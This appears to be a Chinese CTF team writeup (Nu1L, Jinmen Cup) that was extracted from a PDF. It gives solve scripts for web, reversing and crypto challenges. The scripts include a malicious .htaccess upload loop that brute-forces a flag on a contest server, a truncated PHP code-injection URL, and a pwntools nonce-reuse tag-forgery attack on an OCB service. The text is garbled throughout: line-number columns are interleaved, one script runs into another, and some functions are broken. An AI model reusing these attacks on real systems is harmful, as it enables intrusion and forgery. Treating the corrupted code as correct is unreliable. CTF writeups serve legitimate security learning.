津⻔杯Writeup - Nu1L
津⻔杯Writeup - Nu1L
Web
UploadHub
hate_php
GoOSS
power_cut
RE
GoodRE
easyRe
Crypto
混合编码
justOCB
rsa
Pwn
pwnme
PwnCTFM
no1
easypwn
Misc
m1bmp
m0usb
Mobile
hellehellokey
Web
UploadHub
hate_php
import requests
import string
import hashlib
ip = requests.get('http://118.24.185.108/ip.php').text
print(ip)
def check(a):
    f = '''
ErrorDocument 404 "wupco"
    '''
    resp = requests.post("http://122.112.248.222:20003/index.php?id=167", 
data={'submit': 'submit'}, files={'file': ('.htaccess',f)} )
    a = requests.get("http://122.112.248.222:20003/upload/"+ip+"/a").text
    if "wupco" not in a:
        return False
    else:
        return True
flag = "flag{BN"
c = string.ascii_letters + string.digits + "\{\}"
for j in range(32):
    for i in c:
        print("checking: "+ flag+i)    
        if check(flag+i):
            flag = flag+i
            print(flag)
            break
        else:
            continue
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
http://122.112.214.101:20004/?code=?>0):
        sum.value += delta
        y.value += ( z.value > 5 ) + k[1]
        z.value += ( y.value > 5 ) + k[3]
        n -= 1
    w[0] = y.value
    w[1] = z.value
    return w
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
easyRe
算法:
def decipher(v, k):
    y = c_uint32(v[0])
    z = c_uint32(v[1])
    sum = c_uint32(0xc6ef3720)
    delta = 0x9e3779b9
    n = 32
    w = [0,0]
    while(n>0):
        z.value -= ( y.value > 5 ) + k[3]
        y.value -= ( z.value > 5 ) + k[1]
        sum.value -= delta
        n -= 1
    w[0] = y.value
    w[1] = z.value
    return w
def get_dec(v):
    key = [0x11] * 4
    s =  decipher(v,key)
    res = ''
    for i in s:
        res += p32(i)[::-1].encode('hex').upper()
    return res
if __name__ == "__main__":
    # v = [0x79AE1A3B,0x596080D3]
    print(get_dec([0x79AE1A3B,0x596080D3]))
    print(get_dec([0x80E03E80,0x846C8D73]))
    print(get_dec([0x21A01CF7,0xC7CACA32]))
    print(get_dec([0x45F9AC14,0xC5F5F22F]))
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
枚举seed,得到seed为151
Crypto
混合编码
seed = ~(53 * (2 * f[6] + f[15] + 3 * f[29])) & 0xFFF
for i in range(33):
    s[i] = (0x1ED0675 * seed + 0x6C1) % 0xFE
    seed = s[i]
for i in range(32):
    for j in range(33):
        output[i + j] = (output[i + j] + (f[i] ^ s[j])) ^ 5977654
1
2
3
4
5
6
7
8
seed = 151
magic = 5977654
s = []
for i in range(33):
    tmp = (0x1ED0675 * seed + 0x6C1) % 0xFE
    s.append(tmp)
    seed = tmp
flag = [0 for i in range(32)]
flag[0] = output[0] ^ magic ^ s[0]
for k in range(1,32):
    last = 0
    for i in range(len(bbb[k])-1):
        last = (last + (flag[ bbb[k][i][0] ] ^ s[ bbb[k][i][1] ])) ^ magic
    flag[ k ] = ((output[k] ^ magic) - last) ^ s[ bbb[k][-1][1] ]
for i in flag[:32]:
    print(chr(i&0xff),end='')
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
justOCB
ciphertext, tag = encrypt("I_am_admin_plz_give_me_the_flag", "From user")
想要getflag，唯⼀的区别是associate_data导致的Auth不同，Auth = pmac(associate_data)
只要能构造new_tag = tag ^ pmac("From user") ^ pmac("From admin")就⾏
import base64
s = 
(base64.b64decode('JTJGMTAyJTJGMTA4JTJGOTclMkYxMDMlMkYxMjMlMkYxMTMlMkY0OSUyR
jEyMCUyRjc1JTJGMTEyJTJGMTA5JTJGNTYlMkYxMTglMkY3MyUyRjc2JTJGODclMkYxMTQlMkYxM
DclMkYxMDklMkY4OCUyRjEyMCUyRjg2JTJGNTQlMkYxMDYlMkY0OSUyRjQ5JTJGNzclMkYxMDAlM
kY5OSUyRjcxJTJGMTE2JTJGNzYlMkYxMjIlMkYxMTglMkY4MiUyRjEyMSUyRjg2JTJGMTI1'))
print(''.join(map(lambda x:chr(int(x)), s.split(b'%2F')[1:])))
1
2
3
nonce可以复⽤
需要能够对于任意的msg，可以得到aes.encrypt(msg)，实现任意明⽂加密
需要知道Δ，为此考虑：
m1 = len，可以得到c1 = m1 ^ aes.encrypt(len ^ Δ)
m1 = len, m2 = b"\x00"*16，可以得到c1' = Δ ^ aes.encrypt(len ^ Δ)
因此Δ = c1' ^ len ^ c1
有了Δ后，构造m1 = msg ^ Δ，可以得到c1 = Δ ^ aes.encrypt(msg)，即aes.encrypt(msg) = c1 ^ Δ，实现任
意明⽂加密
回到pmac中，对b"\x00"*16加密，以及对final_xor加密即可得到“From admin"和"From user"的Auth，进⽽
计算出相应的tag
def pmac(data):
    offset = aes.encrypt(b"\x00"*16)
    offset = times3(offset)
    offset = times3(offset)
    offset = times2(offset)
    data += long_to_bytes(int('10000...00', 2)) # 补⻬到16
    offset = times3(offset)
    offset = times3(offset)
    final_xor = xor(offset, data)
    return aes.encrypt(final_xor) 
1
2
3
4
5
6
7
8
9
10
11
12
13
import math
from hashlib import sha256
from itertools import product
from pwn import *
# context.log_level = 'debug'
conn = remote("122.112.199.24", 9999)
# conn = remote("127.0.0.1", 9999)
def proof_of_work():
    s = string.ascii_letters + string.digits
    rec = conn.recvline().decode()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
    suffix = re.findall(r'\(XXXX\+(.*?)\)', rec)[0]
    digest = re.findall(r'== (.*?)\n', rec)[0]
    print(f"suffix: {suffix} \ndigest: {digest}")
    print('Calculating hash...')
    for i in product(s, repeat=4):
        prefix = ''.join(i)
        guess = prefix + suffix
        if sha256(guess.encode()).hexdigest() == digest:
            print(guess)
            break
    conn.sendlineafter(b'Give me XXXX:', prefix.encode())
def choice1(msg):
    nonce = bytearray([0]*16)
    conn.recvuntil(b"Your choice:")
    conn.sendline(b"1")
    conn.sendlineafter(b"Your nonce:", nonce.hex().encode())
    conn.sendlineafter(b"Your message:", msg.hex().encode())
    conn.recvuntil(b"Your ciphertext:",)
    cipher = bytes.fromhex(conn.recvline().strip().decode())
    conn.recvuntil(b"Your tag:",)
    tag = bytes.fromhex(conn.recvline().strip().decode())
    return tag, cipher
def choice2(tag, cipher):
    nonce = bytearray([0]*16)
    conn.recvuntil(b"Your choice:")
    conn.sendline(b"2")
    conn.sendlineafter(b"Your nonce:", nonce.hex().encode())
    conn.sendlineafter(b"Your ciphertext:", cipher.hex().encode())
    conn.sendlineafter(b"Your tag:", tag.hex().encode())
    conn.interactive()
def xor(a,b):
    return bytearray(x^y for x,y in zip(a,b))
def times2(input_data):
    blocksize = 16
    assert len(input_data) == blocksize
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
    # set carry = high bit of src
    output =  bytearray(blocksize)
    carry = input_data[0] >> 7 # either 0 or 1
    for i in range(len(input_data) - 1):
        output[i] = ((input_data[i] > 7)) % 
256
    output[-1] = ((input_data[-1] << 1) ^ (carry * 0x87)) % 256
    assert len(output) == blocksize
    return output
def times3(input_data):
    assert len(input_data) == 16
    output = times2(input_data)
    output = xor(output, input_data)
    assert len(output) == 16
    return output
def aes_encrypt(msg, delta):
    m1 = xor(msg+bytearray([0]*16), delta)
    _, c1 = choice1(m1)
    return xor(c1[:16], delta)
def aes_encrypt2(m1, m2, delta):
    msg = xor(m1, delta) + xor(m2, times2(delta)) + bytearray([0]*16)
    _, cipher = choice1(msg)
    c1 = xor(cipher[:16], delta)
    c2 = xor(cipher[16:32], times2(delta))
    return c1, c2
def cal_delta():
    _len = bytearray([0]*15 + [16*8])
    _, c1  = choice1(_len)
    _, c11 = choice1(_len + bytearray([0]*16))
    c11 = c11[:16]
    delta = xor(xor(c11, _len), c1)
    return delta
def cal_final_xor(header, delta):
    blocksize = 16
    m = 1
    offset = delta                  # delta = times2(offset)，减少⼀次